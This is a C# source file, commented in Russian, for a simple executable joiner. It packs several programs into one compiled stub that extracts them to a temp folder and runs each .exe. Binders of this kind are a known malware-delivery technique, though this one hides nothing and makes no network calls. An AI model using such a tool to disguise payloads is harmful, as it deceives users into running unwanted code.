using System;
using System.IO;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;
using System.Security.Principal;
using System.Windows.Forms;
using System.Drawing;
using System.Threading;

namespace SimpleJoiner
{
    public class PEJoiner
    {
        // Структура для хранения информации о файле PE
        public class PEFile
        {
            public string FilePath { get; set; }
            public byte[] FileData { get; set; }
            public string FileName { get; set; }

            public PEFile(string filePath)
            {
                FilePath = filePath;
                FileData = File.ReadAllBytes(filePath);
                FileName = Path.GetFileName(filePath);
            }
        }

        // Список файлов для склейки
        private List<PEFile> _files = new List<PEFile>();
        
        // Строка для сохранения ошибок компиляции
        private string _lastError = string.Empty;

        // Добавление файла в список
        public void AddFile(string filePath, bool autoRun = false)
        {
            try
            {
                PEFile file = new PEFile(filePath);
                _files.Add(file);
            }
            catch (Exception ex)
            {
                throw new Exception(String.Format("Ошибка при добавлении файла: {0}", ex.Message));
            }
        }

        // Удаление файла из списка
        public void RemoveFile(int index)
        {
            if (index >= 0 && index < _files.Count)
            {
                _files.RemoveAt(index);
            }
        }

        // Получение списка файлов
        public List<PEFile> GetFiles()
        {
            return _files;
        }
        
        // Получение последней ошибки
        public string GetLastError()
        {
            return _lastError;
        }

        // Проверка прав администратора
        private bool IsAdministrator()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        // Склейка файлов в один исполняемый файл
        public void JoinFiles(string outputPath)
        {
            if (_files.Count == 0)
            {
                throw new Exception("Не добавлено ни одного файла для склейки");
            }

            try
            {
                // Проверяем наличие прав администратора
                if (!IsAdministrator())
                {
                    throw new Exception("Для корректной работы программы требуются права администратора. Пожалуйста, запустите программу от имени администратора.");
                }

                _lastError = string.Empty;
                
                // Создаем заголовок со служебной информацией
                string resourcesDir = Path.Combine(Path.GetDirectoryName(outputPath), "Resources");
                Directory.CreateDirectory(resourcesDir);

                string stubCode = GenerateStubCode();
                string stubPath = Path.Combine(resourcesDir, "stub.cs");
                File.WriteAllText(stubPath, stubCode);

                // Создаем временную директорию для файлов
                string tempDir = Path.Combine(Path.GetTempPath(), "SimpleJoiner_" + Guid.NewGuid().ToString());
                Directory.CreateDirectory(tempDir);

                // Собираем информацию о файлах в формате JSON
                string fileInfoJson = "{ \"files\": [";
                for (int i = 0; i < _files.Count; i++)
                {
                    string filePath = Path.Combine(tempDir, _files[i].FileName);
                    File.WriteAllBytes(filePath, _files[i].FileData);
                    
                    fileInfoJson += String.Format("{{ \"name\": \"{0}\" }}", _files[i].FileName);
                    
                    if (i < _files.Count - 1)
                    {
                        fileInfoJson += ", ";
                    }
                }
                fileInfoJson += "] }";

                string jsonPath = Path.Combine(tempDir, "fileinfo.json");
                File.WriteAllText(jsonPath, fileInfoJson);

                // Создаем архив с файлами
                string archivePath = Path.Combine(tempDir, "files.bin");
                CreateArchive(tempDir, archivePath);

                // Компилируем стаб-программу
                if (!CompileStub(stubPath, archivePath, outputPath))
                {
                    throw new Exception(String.Format("Ошибка при компиляции программы:\n{0}", _lastError));
                }

                // Очистка временных файлов
                try
                {
                    Directory.Delete(tempDir, true);
                    Directory.Delete(resourcesDir, true);
                }
                catch (Exception ex) 
                { 
                    // Логируем ошибку очистки, но не прерываем работу
                    _lastError += String.Format("\nОшибка при очистке временных файлов: {0}", ex.Message);
                }
            }
            catch (Exception ex)
            {
                throw new Exception(String.Format("Ошибка при склейке файлов: {0}", ex.Message));
            }
        }

        // Создание архива с файлами
        private void CreateArchive(string sourceDir, string outputPath)
        {
            // Простая реализация: копируем все файлы в бинарный архив
            using (FileStream outputStream = new FileStream(outputPath, FileMode.Create))
            {
                // Записываем количество файлов
                byte[] fileInfoBytes = File.ReadAllBytes(Path.Combine(sourceDir, "fileinfo.json"));
                outputStream.Write(BitConverter.GetBytes(fileInfoBytes.Length), 0, 4);
                outputStream.Write(fileInfoBytes, 0, fileInfoBytes.Length);

                // Копируем все файлы (кроме fileinfo.json)
                foreach (var file in _files)
                {
                    string filePath = Path.Combine(sourceDir, file.FileName);
                    byte[] fileData = File.ReadAllBytes(filePath);
                    
                    // Записываем длину имени файла и само имя
                    byte[] fileNameBytes = System.Text.Encoding.UTF8.GetBytes(file.FileName);
                    outputStream.Write(BitConverter.GetBytes(fileNameBytes.Length), 0, 4);
                    outputStream.Write(fileNameBytes, 0, fileNameBytes.Length);
                    
                    // Записываем размер файла и сами данные
                    outputStream.Write(BitConverter.GetBytes(fileData.Length), 0, 4);
                    outputStream.Write(fileData, 0, fileData.Length);
                }
            }
        }

        // Генерация кода стаб-программы
        private string GenerateStubCode()
        {
            return @"
using System;
using System.IO;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;
using System.Reflection;
using System.Windows.Forms;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;

class Program
{
    private static string _tempDir;

    [STAThread]
    static void Main(string[] args)
    {
        try
        {
            // Создаем временную директорию с рандомным именем
            _tempDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
            Directory.CreateDirectory(_tempDir);
            
            // Извлекаем файлы из внедренного ресурса
            ExtractFiles();
            
            // Запускаем все EXE-файлы
            RunExeFiles();
        }
        catch
        {
            Cleanup();
        }
    }

    // Запуск всех EXE-файлов
    static void RunExeFiles()
    {
        try
        {
            string[] files = Directory.GetFiles(_tempDir, ""*.exe"");
            foreach (string file in files)
            {
                try
                {
                    ProcessStartInfo startInfo = new ProcessStartInfo();
                    startInfo.FileName = file;
                    startInfo.UseShellExecute = true;
                    startInfo.WindowStyle = ProcessWindowStyle.Normal;
                    Process.Start(startInfo);
                    Thread.Sleep(200);
                }
                catch { }
            }
        }
        catch { }
    }

    // Извлечение файлов из ресурса
    static void ExtractFiles()
    {
        // Получаем текущую сборку
        Assembly assembly = Assembly.GetExecutingAssembly();
        
        // Находим внедренный ресурс
        string resourceName = ""files.bin"";
        using (Stream stream = assembly.GetManifestResourceStream(resourceName))
        {
            if (stream == null)
            {
                throw new Exception(""Ресурс с файлами не найден"");
            }

            using (BinaryReader reader = new BinaryReader(stream))
            {
                // Читаем информацию о файлах
                int jsonLength = reader.ReadInt32();
                string jsonData = Encoding.UTF8.GetString(reader.ReadBytes(jsonLength));
                
                // Парсим JSON с информацией о файлах
                var fileInfo = SimpleJsonParser.Parse(jsonData);
                
                // Извлекаем каждый файл
                while (stream.Position < stream.Length)
                {
                    try 
                    {
                        // Читаем имя файла
                        int fileNameLength = reader.ReadInt32();
                        string fileName = Encoding.UTF8.GetString(reader.ReadBytes(fileNameLength));
                        
                        // Читаем содержимое файла
                        int fileSize = reader.ReadInt32();
                        byte[] fileData = reader.ReadBytes(fileSize);
                        
                        // Сохраняем файл во временную директорию
                        File.WriteAllBytes(Path.Combine(_tempDir, fileName), fileData);
                    }
                    catch (Exception ex)
                    {
                        throw new Exception(String.Format(""Ошибка при извлечении файлов: {0}"", ex.Message));
                    }
                }
            }
        }
    }

    // Очистка временных файлов
    static void Cleanup()
    {
        try
        {
            if (Directory.Exists(_tempDir))
            {
                Directory.Delete(_tempDir, true);
            }
        }
        catch
        {
            // Игнорируем ошибки при очистке
        }
    }
}

// Простой парсер JSON для нашего случая
public static class SimpleJsonParser
{
    public static Dictionary<string, object> Parse(string json)
    {
        var result = new Dictionary<string, object>();
        json = json.Trim();
        
        if (json.StartsWith(""{"") && json.EndsWith(""}""))
        {
            json = json.Substring(1, json.Length - 2).Trim();
            
            foreach (var pair in SplitJsonPairs(json))
            {
                var parts = pair.Split(new[] { ':' }, 2);
                if (parts.Length == 2)
                {
                    string key = StripQuotes(parts[0].Trim());
                    string value = parts[1].Trim();
                    
                    // Если значение - объект или массив, рекурсивно парсим
                    if (value.StartsWith(""{"") && value.EndsWith(""}""))
                    {
                        result[key] = Parse(value);
                    }
                    else if (value.StartsWith(""["") && value.EndsWith(""]""))
                    {
                        result[key] = ParseArray(value);
                    }
                    else if (value == ""true"" || value == ""false"")
                    {
                        result[key] = value == ""true"";
                    }
                    else if (value == ""null"")
                    {
                        result[key] = null;
                    }
                    else if (value.StartsWith(""\"""") && value.EndsWith(""\""""))
                    {
                        result[key] = StripQuotes(value);
                    }
                    else 
                    {
                        double doubleValue;
                        if (double.TryParse(value, out doubleValue))
                        {
                            result[key] = doubleValue;
                        }
                        else
                        {
                            result[key] = value;
                        }
                    }
                }
            }
        }
        
        return result;
    }
    
    private static List<object> ParseArray(string json)
    {
        var result = new List<object>();
        json = json.Trim();
        
        if (json.StartsWith(""["") && json.EndsWith(""]""))
        {
            json = json.Substring(1, json.Length - 2).Trim();
            
            if (!string.IsNullOrEmpty(json))
            {
                foreach (var item in SplitJsonArray(json))
                {
                    string value = item.Trim();
                    
                    if (value.StartsWith(""{"") && value.EndsWith(""}""))
                    {
                        result.Add(Parse(value));
                    }
                    else if (value.StartsWith(""["") && value.EndsWith(""]""))
                    {
                        result.Add(ParseArray(value));
                    }
                    else if (value == ""true"" || value == ""false"")
                    {
                        result.Add(value == ""true"");
                    }
                    else if (value == ""null"")
                    {
                        result.Add(null);
                    }
                    else if (value.StartsWith(""\"""") && value.EndsWith(""\""""))
                    {
                        result.Add(StripQuotes(value));
                    }
                    else 
                    {
                        double doubleValue;
                        if (double.TryParse(value, out doubleValue))
                        {
                            result.Add(doubleValue);
                        }
                        else
                        {
                            result.Add(value);
                        }
                    }
                }
            }
        }
        
        return result;
    }
    
    private static string StripQuotes(string value)
    {
        if (value.StartsWith(""\"""") && value.EndsWith(""\""""))
        {
            return value.Substring(1, value.Length - 2);
        }
        return value;
    }
    
    private static List<string> SplitJsonPairs(string json)
    {
        var result = new List<string>();
        bool inQuotes = false;
        int brackets = 0;
        int squareBrackets = 0;
        int startIndex = 0;
        
        for (int i = 0; i < json.Length; i++)
        {
            char c = json[i];
            
            if (c == '""' && (i == 0 || json[i - 1] != '\\'))
            {
                inQuotes = !inQuotes;
            }
            else if (!inQuotes)
            {
                if (c == '{') brackets++;
                else if (c == '}') brackets--;
                else if (c == '[') squareBrackets++;
                else if (c == ']') squareBrackets--;
                
                if (c == ',' && brackets == 0 && squareBrackets == 0)
                {
                    result.Add(json.Substring(startIndex, i - startIndex));
                    startIndex = i + 1;
                }
            }
        }
        
        if (startIndex < json.Length)
        {
            result.Add(json.Substring(startIndex));
        }
        
        return result;
    }
    
    private static List<string> SplitJsonArray(string json)
    {
        var result = new List<string>();
        bool inQuotes = false;
        int brackets = 0;
        int squareBrackets = 0;
        int startIndex = 0;
        
        for (int i = 0; i < json.Length; i++)
        {
            char c = json[i];
            
            if (c == '""' && (i == 0 || json[i - 1] != '\\'))
            {
                inQuotes = !inQuotes;
            }
            else if (!inQuotes)
            {
                if (c == '{') brackets++;
                else if (c == '}') brackets--;
                else if (c == '[') squareBrackets++;
                else if (c == ']') squareBrackets--;
                
                if (c == ',' && brackets == 0 && squareBrackets == 0)
                {
                    result.Add(json.Substring(startIndex, i - startIndex));
                    startIndex = i + 1;
                }
            }
        }
        
        if (startIndex < json.Length)
        {
            result.Add(json.Substring(startIndex));
        }
        
        return result;
    }
}";
        }

        // Компиляция стаб-программы 
        private bool CompileStub(string stubPath, string archivePath, string outputPath)
        {
            try
            {
                _lastError = string.Empty;
                
                // Находим компилятор C#
                string cscPath = @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe";
                if (!File.Exists(cscPath))
                {
                    // Пробуем найти в других локациях
                    string[] possiblePaths = new string[] {
                        @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
                        @"C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe",
                        @"C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe"
                    };
                    
                    foreach (var path in possiblePaths)
                    {
                        if (File.Exists(path))
                        {
                            cscPath = path;
                            break;
                        }
                    }
                    
                    if (!File.Exists(cscPath))
                    {
                        _lastError = "Компилятор C# не найден. Убедитесь, что .NET Framework установлен.";
                        return false;
                    }
                }

                // Проверяем, существуют ли файлы
                if (!File.Exists(stubPath))
                {
                    _lastError = String.Format("Файл исходного кода не найден: {0}", stubPath);
                    return false;
                }
                
                if (!File.Exists(archivePath))
                {
                    _lastError = String.Format("Файл архива не найден: {0}", archivePath);
                    return false;
                }
                
                // Создаем директорию для вывода, если она не существует
                string outputDir = Path.GetDirectoryName(outputPath);
                if (!Directory.Exists(outputDir))
                {
                    Directory.CreateDirectory(outputDir);
                }

                // Подготавливаем параметры компиляции
                string resourcesParam = String.Format("/resource:\"{0}\",files.bin", archivePath);
                string references = "/reference:System.dll /reference:System.Windows.Forms.dll /reference:System.Drawing.dll";
                string command = String.Format("/target:winexe /out:\"{0}\" {1} {2} \"{3}\"", outputPath, resourcesParam, references, stubPath);
                
                // Запускаем процесс компиляции
                Process process = new Process();
                process.StartInfo.FileName = cscPath;
                process.StartInfo.Arguments = command;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;
                process.StartInfo.CreateNoWindow = true;
                
                StringBuilder output = new StringBuilder();
                StringBuilder error = new StringBuilder();
                
                process.OutputDataReceived += (sender, args) => 
                { 
                    if (!string.IsNullOrEmpty(args.Data)) 
                        output.AppendLine(args.Data); 
                };
                
                process.ErrorDataReceived += (sender, args) => 
                { 
                    if (!string.IsNullOrEmpty(args.Data)) 
                        error.AppendLine(args.Data); 
                };
                
                process.Start();
                process.BeginOutputReadLine();
                process.BeginErrorReadLine();
                process.WaitForExit();
                
                // Проверяем результат
                if (process.ExitCode != 0)
                {
                    _lastError = String.Format("Ошибка компиляции (код {0}):\n\n", process.ExitCode);
                    
                    if (!string.IsNullOrEmpty(error.ToString()))
                    {
                        _lastError += error.ToString();
                    }
                    else if (!string.IsNullOrEmpty(output.ToString()))
                    {
                        _lastError += output.ToString();
                    }
                    else
                    {
                        _lastError += "Компилятор не вернул информацию об ошибке.";
                    }
                    
                    return false;
                }
                
                // Проверяем существование выходного файла
                if (!File.Exists(outputPath))
                {
                    _lastError = "Не удалось создать исполняемый файл после компиляции.";
                    return false;
                }
                
                return true;
            }
            catch (Exception ex)
            {
                _lastError = String.Format("Ошибка при компиляции: {0}", ex.Message);
                return false;
            }
        }
    }
} 